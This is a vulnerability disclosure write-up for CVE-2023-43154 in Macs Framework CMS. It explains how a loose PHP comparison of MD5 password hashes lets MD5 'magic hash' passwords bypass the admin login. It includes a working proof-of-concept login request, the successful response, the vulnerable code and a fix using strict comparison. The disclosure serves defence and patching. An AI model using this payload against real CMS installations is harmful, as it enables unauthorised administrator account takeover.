# CVE-2023-43154 - Macs Framework v1.1.4f CMS Type Confusion Vulnerability

## Table of Contents
1. [Overview](#overview)
2. [Proof of Concept](#proof-of-concept)
3. [Technical Debrief](#technical-debrief)
4. [Mitigation](#mitigation)


## Overview

**CVE-ID**: CVE-2023-43154

**CVSS 3.1**: 9.8

**Vulnerability Description**: A loose comparison in the `isValidLogin()` function results in a PHP type confusion
vulnerability that can be abused to bypass authentication and takeover the administrator account.

**Vulnerable Parameters**: The username and password of the users on the CMS.

**Affected Products**: Macs Framework v1.14f - Content Management System

**Limitations**:
1. The username of the victim account must be previously known or a zero-like string
2. The password used with the account must result in a "magic hash".

**User Interaction Required**: None




**References**: [https://github.com/ally-petitt/CVE-2023-43154-PoC](https://github.com/ally-petitt/CVE-2023-43154-PoC)

**Discovery Date**: September 7, 2023

**Reported By**: Ally Petitt


## Proof of Concept

Logging in at the URI `/index.php/main/cms/login` with the username of the victim account and any 
password that results in a magic hash will lead to authentication bypass.

A sample login is shown below.

### Send Payload 

```
POST /index.php/main/cms/login HTTP/1.1
Host: 172.17.0.2
Content-Length: 62
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://172.17.0.2
Referer: http://172.17.0.2/index.php/main/cms/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=di4ceqcv9432vcb0p27rkh7k82
Connection: close

ajaxRequest=true&&username=testadmin&password=0gdVIdSQL8Cm&scrollPosition=0
```

### HTTP Response

```
HTTP/1.1 200 OK
Date: Sat, 09 Sep 2023 02:01:26 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 72
Connection: close
Content-Type: text/html; charset=ISO-8859-1

<script>window.location.href="http://172.17.0.2/index.php/home"</script>
```

The status code of 200 and the redirect to `/index.php/home` are both indications that the login attempt 
was successful. The password of `testadmin` was not the password used in the login attempt (`0gdVIdSQL8Cm`).
Instead, it was set to `QNKCDZO`.


## Technical Debrief

When a user attempts to log in, their supplied password is hashed and and sent as a parameter to
the `isValidLogin()` function via the initial `login()` function that is called when a POST request
is made to `/index.php/Main/CMS/login`.

```
    public function login()
    {      
      if($this->isValidLogin(Post::getByKey('username'), $this->encrypt(Post::getByKey('password')) ) || ( $this->isAdminLoggedIn() ))
      --snip--
    }
```

The `isValidLogin()` function begins on line 83 of file `/Application/plugins/CMS/controllers/CMS.php`.
It is vulnerable to a type confusion vulnerability due to its use of 2 equal signs instead of 3.

```
    private function isValidLogin($username, $password)
    {
      $this->loadModels();
      
      $loggedIn = false;

      foreach (Config::$editInPlaceAdmins as $key=>$account)
      {
        if(( $account['username'] == $username) && ($account['password'] == $password ) )
        {
          $loggedIn = true;
          Session::set('AdminLoggedIn', $account);
          break;
        }
      }
```

As shown in the `if` statement, the username and password are being checked with a loose comparison, leading
to a PHP type confusion vulnerability. This can be abused when logging in with a password that results in a 
magic hash, or hash that is interpretted by PHP to have the value `0` during a loose comparison. A list of such
passwords can be found [here](https://github.com/spaze/hashes).

To exploit this, it is important to first understand the format that `$account['password']` is stored in.
In the function used to save a new user account on line 730 of the aforementioned `CMS.php` file, it becomes
clear that the password is first passed through an `encrypt` function before it is stored.
```
  $password = $this->encrypt(Post::getByKey('password'));
  $confirmPassword = $this->encrypt(Post::getByKey('confirmPassword'));
  -- snip --
  private function saveNewUser( $username, $password, $emailAddress, $roleId)
```

Continuing to the function that is called after the password is run through `encrypt`, the following
code is used:
```
    private function saveNewUser( $username, $password, $emailAddress, $roleId)
    {
      --snip--
            $this->usersModel->insertUser($username, $password, $emailAddress, $roleId);
      --snip--
    }
```

Based on the code above, it is apparent that the "encrypted" password was placed directly into the
`users` Model of the MVC framework. Finally, to exploit this vulnerability, it is necessary to understand
how the `encrypt` function works as its output is being directly compared against the user input.

```
    private function encrypt( $string )
    {      
      return md5($string);
    }
```

The encrypt function returns the MD5 hash of the string passed to it. This means that when the `login()`
function is called with the user-supplied credentials, the inputted password is hashed and compared against
the stored MD5 hash of the victim account.

The implication is that when using a password that results in a PHP collision, or magic hash, it will register 
as being equivilent when compared against a stored password that also follows the format of a magic hash.
As a result, a very large number of passwords can be used to authenticate to and takeover the administrator
account, even when the initial password is not previously known.


## Mitigation
This vulnerability can be mitigated by changing the loose comparison in the `isValidLogin()` function
to a strict comparison by replacing `==` with `===`.


